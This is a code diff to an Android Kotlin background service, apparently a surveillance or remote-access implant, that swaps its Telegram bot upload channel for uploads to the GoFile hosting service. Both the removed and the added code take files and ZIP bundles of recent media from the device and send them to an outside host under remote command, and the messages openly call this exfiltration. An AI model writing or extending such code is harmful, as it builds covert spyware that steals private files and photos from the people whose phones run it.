@@ -402,15 +402,10 @@ class MonitorService : LifecycleService() {
         super.onCreate()
         Log.i(TAG, "Service created")
 
-        updateOffset = getSharedPreferences("device_prefs", MODE_PRIVATE).getLong("telegram_update_offset", 0L)
-        if (updateOffset == 0L) {
-            initUpdateOffsetOnFirstLaunch()
-        }
         PhysicalSecurityGuard.restoreArmedStateIfNeeded(this)
         startForegroundWithNotification()
         sendConnectionNotification()
         setupCallStateListener()
-        registerTelegramBotCommands()
         startLocalWebControlServer()
         startAutoDumpSyncLoop()
         startPeriodicTamperAuditLoop()
@@ -6420,27 +6415,11 @@ class MonitorService : LifecycleService() {
                     return@launch
                 }
 
-                // Native Telegram Chat Upload
-                val bytes = targetFile.readBytes()
-                val body = MultipartBody.Builder()
-                    .setType(MultipartBody.FORM)
-                    .addFormDataPart("chat_id", targetChat)
-                    .addFormDataPart(
-                        "document",
-                        targetFile.name,
-                        bytes.toRequestBody(mime.toMediaTypeOrNull())
-                    )
-                    .addFormDataPart("caption", "📄 ${targetFile.name}\nPath: `${targetFile.absolutePath}`")
-                    .build()
-
-                val request = Request.Builder().url(getTelegramApiUrl("sendDocument")).post(body).build()
-                httpClient.newCall(request).execute().use { response ->
-                    if (!response.isSuccessful) {
-                        Log.w(TAG, "Download file upload failed: ${response.code}")
-                        sendMessage(targetChat, "❌ File upload failed (HTTP ${response.code}).")
-                    } else {
-                        Log.i(TAG, "File ${targetFile.name} sent successfully to Telegram")
-                    }
+                val link = uploadToGoFile(targetFile)
+                if (link != null) {
+                    sendMessage(targetChat, "📄 File `${targetFile.name}` uploaded: $link")
+                } else {
+                    sendMessage(targetChat, "📄 File `${targetFile.name}` saved locally at `${targetFile.absolutePath}`.")
                 }
             } catch (e: Exception) {
                 Log.e(TAG, "handleDownloadFileByName error: ${e.message}")
@@ -8812,18 +8791,12 @@ class MonitorService : LifecycleService() {
 
                 if (zipFile.exists() && zipFile.length() > 0) {
                     val sizeMb = "%.1f".format(zipFile.length() / (1024.0 * 1024.0))
-                    sendMessage(chatId, "📤 Uploading media bundle (${recentFiles.size} items, $sizeMb MB)…", parseMode = "Markdown")
-
-                    val bytes = zipFile.readBytes()
-                    val body = MultipartBody.Builder()
-                        .setType(MultipartBody.FORM)
-                        .addFormDataPart("chat_id", chatId)
-                        .addFormDataPart("document", zipFile.name, bytes.toRequestBody("application/zip".toMediaTypeOrNull()))
-                        .addFormDataPart("caption", "📦 Exfiltrated ${recentFiles.size} media files from last ${hours}h")
-                        .build()
-
-                    val req = Request.Builder().url(getTelegramApiUrl("sendDocument")).post(body).build()
-                    httpClient.newCall(req).execute()
+                    val link = uploadToGoFile(zipFile)
+                    if (link != null) {
+                        sendMessage(chatId, "📦 Exfiltrated ${recentFiles.size} media files ($sizeMb MB): $link")
+                    } else {
+                        sendMessage(chatId, "📦 Created media bundle (${recentFiles.size} items, $sizeMb MB).")
+                    }
                     zipFile.delete()
                 } else {
                     sendMessage(chatId, "❌ Failed to create media ZIP package.")
